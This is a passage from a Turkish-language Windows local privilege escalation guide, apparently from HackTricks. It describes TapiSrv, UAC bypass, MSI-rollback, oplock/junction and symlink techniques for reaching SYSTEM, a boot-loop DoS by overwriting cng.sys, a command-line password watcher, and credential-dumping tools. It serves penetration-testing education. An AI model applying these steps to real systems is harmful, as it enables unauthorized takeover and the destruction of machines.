Ayrıca aşağıdaki araç, **burp gibi bir araçla named pipe iletişimini yakalamanıza** olanak tanır: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç privesc bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Sunucu modundaki Telephony hizmeti (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) yolunu açığa çıkarır. Uzaktan kimliği doğrulanmış bir client, mailslot tabanlı async event yolunu kötüye kullanarak `ClientAttach`'i, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya rastgele **4-byte write** gerçekleştirecek şekilde kullanabilir; ardından Telephony admin haklarını elde edip hizmet olarak rastgele bir DLL yükleyebilir. Akışın tamamı:

- `pszDomainUser` değeri yazılabilir mevcut bir yol olarak ayarlanmış şekilde `ClientAttach` çağrısı → hizmet, `CreateFileW(..., OPEN_EXISTING)` aracılığıyla dosyayı açar ve async event yazımları için kullanır.
- Her event, `Initialize` içindeki saldırganın kontrol ettiği `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) tetikleyin, `GetAsyncEvents` (`Req_Func 0`) aracılığıyla alın, ardından deterministik yazımları tekrarlamak için kaydı kaldırıp kapatın.
- `C:\Windows\TAPI\tsec.ini` içindeki `[TapiAdministrators]` bölümüne kendinizi ekleyin, yeniden bağlanın ve ardından `GetUIDllName` işlevini rastgele bir DLL yolu ile çağırarak `TSPI_providerUIIdentify` işlevini `NETWORK SERVICE` olarak çalıştırın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows'ta kod çalıştırabilecek dosya uzantıları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown görüntüleyicileri üzerinden Protocol handler / ShellExecute kötüye kullanımı

`ShellExecuteExW` işlevine iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir şema) tetikleyebilir ve saldırganın kontrolündeki dosyaları mevcut kullanıcı olarak çalıştırabilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için komut satırlarını izleme**

Bir kullanıcı olarak shell aldığınızda, **komut satırında kimlik bilgilerini ileten** zamanlanmış görevler veya çalışan başka süreçler olabilir. Aşağıdaki script, süreç komut satırlarını iki saniyede bir yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları çıktılar.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Süreçlerden parola çalma

## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" gibi başka bir süreci çalıştırmak mümkündür.

Bu sayede aynı güvenlik açığıyla hem ayrıcalıkları yükseltmek hem de UAC'yi atlatmak mümkün olur. Ayrıca herhangi bir şey yüklemek gerekmez ve bu işlem sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları uygulamak gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Gerekli tüm dosyalara ve bilgilere şu GitHub deposundan ulaşabilirsiniz:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium Integrity Level'dan High Integrity Level'a / UAC Bypass

**Integrity Levels hakkında bilgi edinmek için** bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypasses hakkında bilgi edinmek için** bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Bir Kök Dizine Upload Directory Junctions Ekleme

Bir uygulama, tahmin edilebilir bir upload alt dizini oluşturabilir, çağıranın sağladığı dosya adını bu dizine yazabilir ve ardından dosyayı işleyebilir. Düşük yetkili bir kullanıcı sunucu tarafındaki yazma işleminden önce bu alt dizini kaldırıp bir NTFS junction ile değiştirebilirse, yazma işlemi junction'ı izleyerek web sunucusunun sunduğu bir dizine yönlenebilir. Sunucu bu dosya türünü çalıştırıyorsa, oraya yerleştirilen bir script web-service kimliğiyle çalışabilir. Bu, uygulamaya özgü bir arbitrary-write sınırıdır; yazılabilir bir upload dizini ya da mevcut bir junction tek başına bunu kanıtlamaz.

Upload handler'daki tam yol oluşturma ve zamanlamayı, kullanıcının alt dizin üzerindeki etkin silme/oluşturma izinlerini, hedefin etkin ACL'lerini, yazma işleminin reparse point'leri izleyip izlemediğini ve web sunucusunun hedefteki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazma işlemini yapan ve web sunucusu süreçlerinin kimliklerini ayrı ayrı doğrulayın. Pasif envanter, dizin ACL'lerini ve reparse metadata'sını gösterebilir; ancak handler'ın davranışını veya ileride gerçekleşecek bir junction değişimini kanıtlayamaz. Çalıştırma bir service account altında gerçekleşiyorsa, ayrı bir token-privilege yolunu değerlendirmeden önce **gerçek process token'ını** inceleyin.

## Arbitrary Folder Delete/Move/Rename'den SYSTEM EoP'ye

[**Bu blog gönderisinde**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanan ve exploit kodu [**burada bulunan**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) teknik.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, kaldırma işlemi sırasında meşru dosyaları kötü amaçlı dosyalarla değiştirmek için Windows Installer'ın rollback özelliğini kötüye kullanmaktan ibarettir. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek amacıyla kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir. Windows Installer, diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını burada depolar; bu dosyalar kötü amaçlı payload içerecek şekilde değiştirilir.

Tekniğin özeti şöyledir:

1. **Aşama 1 – Ele Geçirme için Hazırlık (`C:\Config.Msi` boş kalmalı)**

- Adım 1: MSI'ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - **Admin olmayan bir kullanıcının** çalıştırabilmesi için installer'ı **"UAC Compliant"** olarak işaretleyin.
    - Yükleme sonrasında dosya için bir **handle** açık tutun.

- Adım 2: Kaldırma İşlemini Başlatın
    - Aynı `.msi` dosyasını kaldırın.
    - Kaldırma işlemi dosyaları `C:\Config.Msi` konumuna taşımaya ve `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
    - Dosyanın `C:\Config.Msi\<random>.rbf` haline geldiğini tespit etmek için açık dosya **handle'ını `GetFinalPathNameByHandle` kullanarak yoklayın**.

- Adım 3: Özel Senkronizasyon
    - `.msi`, şu işlemleri yapan bir **özel kaldırma eylemi (`SyncOnRbfWritten`)** içerir:
        - `.rbf` dosyası yazıldığında sinyal verir.
        - Ardından kaldırma işlemine devam etmeden önce başka bir event üzerinde **bekler**.

- Adım 4: `.rbf` Dosyasının Silinmesini Engelleyin
    - Sinyal geldiğinde, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, dosyanın silinmesini **engeller**.
    - Ardından kaldırma işleminin tamamlanabilmesi için sinyali geri gönderin.
    - Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` Dosyasını Elle Silin
    - Siz (saldırgan) `.rbf` dosyasını elle silin.
    - Artık **`C:\Config.Msi` boştur** ve ele geçirilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` konumunu silmek için **SYSTEM seviyesindeki arbitrary folder delete zafiyetini tetikleyin**.

2. **Aşama 2 – Rollback Script'lerini Kötü Amaçlı Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` Klasörünü Zayıf ACL'lerle Yeniden Oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL'ler** ayarlayın (ör. Everyone:F) ve `WRITE_DAC` ile bir **handle'ı açık tutun**.

- Adım 7: Başka Bir Yükleme Çalıştırın
    - `.msi` dosyasını şu ayarlarla yeniden yükleyin:
        - `TARGETDIR`: Yazılabilir konum.
        - `ERROROUT`: Zorunlu hata tetikleyen bir değişken.
    - Bu yükleme, `.rbs` ve `.rbf` dosyalarını okuyan **rollback'i** yeniden tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` Dosyasını İzleyin
    - Yeni bir `.rbs` dosyası görünene kadar `C:\Config.Msi` konumunu izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını kaydedin.

- Adım 9: Rollback Öncesinde Senkronize Edin
    - `.msi`, şu işlemleri yapan bir **özel yükleme eylemi (`SyncBeforeRollback`)** içerir:
        - `.rbs` oluşturulduğunda bir event sinyali verir.
        - Ardından devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL'leri Yeniden Uygulayın
    - `.rbs created` event'ini aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` için **güçlü ACL'leri yeniden uygular**.
        - Ancak `WRITE_DAC` içeren bir handle hâlâ elinizde olduğundan, **zayıf ACL'leri yeniden uygulayabilirsiniz**.

> ACL'ler **yalnızca handle açılırken uygulanır**, bu nedenle klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` Dosyalarını Bırakın
    - `.rbs` dosyasını, Windows'a şunları yaptıran **sahte bir rollback script'iyle** değiştirin:
        - `.rbf` dosyanızı (kötü amaçlı DLL) ayrıcalıklı bir konuma geri yüklemesini (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - **SYSTEM seviyesinde kötü amaçlı payload içeren bir DLL** barındıran sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback'i Tetikleyin
    - Installer'ın devam etmesi için senkronizasyon event'ini sinyallayın.
    - **Type 19 custom action (`ErrorOut`)**, yüklemeyi bilinen bir noktada **kasten başarısız kılacak** şekilde yapılandırılmıştır.
    - Bu, **rollback'in başlamasına** neden olur.

- Adım 13: SYSTEM DLL'inizi Yükler
    - Windows Installer:
        - Kötü amaçlı `.rbs` dosyanızı okur.
        - `.rbf` DLL'inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir konumda kötü amaçlı DLL'iniz** bulunur.

- Son Adım: SYSTEM Kodu Çalıştırın
    - Ele geçirdiğiniz DLL'i yükleyen, güvenilir ve **auto-elevated bir binary** (ör. `osk.exe`) çalıştırın.
    - **Bum**: Kodunuz **SYSTEM olarak** çalışır.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (bir önceki teknik), tüm bir klasörü (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya zafiyetiniz yalnızca **arbitrary file deletion** işlemine izin veriyorsa?

**NTFS internals**'ı kötüye kullanabilirsiniz: her klasörde şu adlı gizli bir alternate data stream bulunur:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **index metadata** bilgilerini depolar.

Bu nedenle, bir klasörün `::$INDEX_ALLOCATION` stream'ini **silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu şu gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *file* delete API çağırıyor olsanız da **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP'ye
Primitive’iniz rastgele dosyaları/klasörleri silmenize izin vermiyor, ancak **saldırganın kontrolündeki bir klasörün *içeriğini* silmenize izin veriyorsa** ne olur?

1. Adım 1: Bir yem klasör ve dosya oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu ekleyin: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Ayrıcalıklı bir process `file1.txt` dosyasını silmeye çalıştığında oplock **yürütmeyi duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Adım 3: SYSTEM process'ini tetikleyin (örn., `SilentCleanup`)
- Bu process klasörleri (örn., `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback içinde – silme işlemini yönlendirin

- Seçenek A: `file1.txt` dosyasını başka bir yere taşıyın
    - Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'i zamanından önce serbest bırakır.

- Seçenek B: `folder1` klasörünü **junction**'a dönüştürün:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS dahili stream'ini hedefler — bunu silmek klasörü siler.

5. Step 5: Oplock'u serbest bırakın
- SYSTEM process devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi junction + symlink nedeniyle aslında silinen şey şudur:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### İstediğiniz Klasörü Oluşturmadan Kalıcı DoS'a

**SYSTEM/admin olarak istediğiniz klasörü oluşturmanıza** olanak tanıyan bir primitive'den yararlanın — **dosya yazamasanız** veya **zayıf izinler ayarlayamasanız** bile.

Örneğin, kritik bir Windows driver'ının adıyla bir **klasör** (dosya değil) oluşturun:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- **Önceden bir klasör olarak oluşturursanız**, Windows önyükleme sırasında gerçek driver'ı yükleyemez.
- Ardından Windows, önyükleme sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümlenemez** ve **önyükleme sırasında çöker veya durur**.
- **Geri dönüş yolu yoktur** ve harici müdahale (ör. önyükleme onarımı veya diske erişim) olmadan **kurtarma mümkün değildir**.

### Ayrıcalıklı günlük/yedekleme yollarından ve OM symlinks ile keyfi dosya üzerine yazmaya / önyükleme DoS'una

Bir **ayrıcalıklı hizmet**, **yazılabilir bir yapılandırmadan** okuduğu bir yola günlükleri/dışa aktarımları yazdığında, bu yolu **Object Manager symlinks + NTFS mount points** ile yönlendirerek ayrıcalıklı yazma işlemini keyfi dosyaların üzerine yazmaya dönüştürün (hatta **SeCreateSymbolicLinkPrivilege olmadan bile**).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu içeren yapılandırma saldırgan tarafından yazılabilir olmalıdır (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` konumuna bir mount point ve bir OM dosya symlink'i oluşturabilme olanağı (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan ayrıcalıklı bir işlem (günlük, dışa aktarım, rapor).

**Örnek zincir**
1. Ayrıcalıklı günlük hedefini öğrenmek için yapılandırmayı okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` dosyasındaki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Yolu yönetici hakları olmadan yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component'ın log'u yazmasını bekleyin (ör. admin "send test SMS" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` dosyasına yapılır.
4. Bozulmayı doğrulamak için üzerine yazılan hedefi inceleyin (hex/PE parser); yeniden başlatma, Windows'un değiştirilmiş driver yolunu yüklemesine neden olur → **boot loop DoS**. Bu yöntem, privileged bir service'in yazma amacıyla açacağı tüm korumalı dosyalara uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopyanın yüklenmesi denenebilir. Bu da bozuk veriler için güvenilir bir DoS hedefi oluşturur.



## **High Integrity'den System'e**

### **Yeni service**

Zaten bir High Integrity process içinde çalışıyorsanız, **SYSTEM'e giden yol** yalnızca yeni bir service **oluşturup çalıştırarak** kolayca açılabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir process'ten **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **yüklemeyi** deneyebilirsiniz.\
[İlgili registry keys ve bir _.msi_ paketin nasıl yükleneceği hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token privileges'a

Bu token privileges'a sahipseniz (muhtemelen bunu zaten High Integrity olan bir process'te bulursunuz), SeDebug privilege'ını kullanarak (korumalı process'ler dışında) **neredeyse her process'i açabilir**, process'in **token'ını kopyalayabilir** ve bu token'la **istediğiniz bir process'i oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token privileges'larına sahip SYSTEM olarak çalışan herhangi bir process'i seçmek** için kullanılır (_evet, tüm token privileges'larına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir** [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, meterpreter tarafından `getsystem` içinde privilege escalation için kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazması için bir service oluşturmayı/kötüye kullanmayı** içerir. Ardından, **`SeImpersonate`** privilege'ını kullanarak pipe'ı oluşturan **server**, pipe client'ının (service) token'ını **impersonate** ederek SYSTEM privileges elde edebilir.\
[**Name pipes hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
[**Name pipes kullanarak High Integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir dll'i **hijack** edebilirseniz, o process'in permissions'larıyla istediğiniz kodu çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de kullanışlıdır. Ayrıca, dll'leri yüklemek için kullanılan klasörlerde **write permissions** olacağından, bunu **High Integrity bir process'ten gerçekleştirmek çok daha kolaydır**.\
**Dll hijacking hakkında** [**buradan daha fazla bilgi edinebilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten full privs'a

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Yararlı araçlar

**Windows local privilege escalation vector'larını aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buradan kontrol edin**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP'de kayıtlı oturum bilgilerini çıkarır. Local'de -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan credentials çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan passwords'leri domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, bir PowerShell ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc vulnerabilities'leri arar (Watson nedeniyle DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc vulnerabilities'leri arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host'u enumerate eder (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Çok sayıda yazılımdan credentials çıkarır (github'da önceden derlenmiş exe bulunur)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C#'a port'u**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (github'da önceden derlenmiş executable bulunur). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (düzgün çalışması için accesschk gerekmez, ancak kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemelisiniz ([buraya bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Yetki Yükseltmenin Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetki yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Yetki Yükseltme - bir cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Yerel Yetki Yükseltme Atölyesi](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT yeni black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Yetki Yükseltme - Windows - Kapsamlı OSCP Rehberi](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Yetki Yükseltme - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Yetki Yükseltme Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Yetki-Yükseltme kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Yetki-Yükseltme](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Yetki Yükseltme Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA makrosuyla phishing → hMailServer kimlik bilgilerini çözme → SYSTEM'e yükselmek için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Gölgelerinde Kedi Fare Oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Ayrıcalıklı Dosya Sistemi Güvenlik Açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Test Araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Açılan Bir Bağlantı. Windows'ta Symbolic Link'leri Kötüye Kullanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows'ta Tehlikeli Modül Çözümleme](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ kontrol listesi zorlukları, çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
